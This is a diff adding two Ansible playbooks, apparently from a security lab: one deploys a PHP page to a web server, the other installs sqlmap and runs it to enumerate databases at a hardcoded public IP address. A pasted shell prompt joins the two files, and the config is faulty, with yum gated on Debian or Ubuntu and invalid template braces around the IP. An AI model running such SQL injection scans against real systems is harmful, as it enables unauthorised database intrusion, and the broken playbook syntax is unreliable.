@@ -1,0 +1,37 @@
+---
+- hosts: node1
+  become: true
+  tasks:
+    - name: Ensure necessary packages are installed
+      yum:
+        name:
+          - php-mariadb # Or php-mariadb, depending on your setup
+          - php-mysqli # This is still needed for mysqli functions
+        state: present
+      when: ansible_distribution == 'Debian' or ansible_distribution == 'Ubuntu'
+
+    - name: Copy index.php to webserver
+      copy:
+        src: ../lamp/index.php
+        dest: /var/www/html/index.php
+      notify: restart apache
+
+  handlers:
+    - name: restart apache
+      service:
+        name: apache2  # Or httpd, depending on your system
+        state: restarted
+[ec2-user@ip-172-31-84-98 sql_injection]$ cat sql_attack.yaml
+---
+- name: Simulate SQL Injection attack
+  hosts: node1
+  become: yes
+  tasks:
+    - name: Install SQLMap for SQL injection simulation
+      yum:
+        name: sqlmap
+        state: present
+        update_cache: yes
+    
+    - name: Simulate SQL injection attack using SQLMap
+      shell: sqlmap -u "http://{{3.80.210.75}}/index.php" --dbs --batch
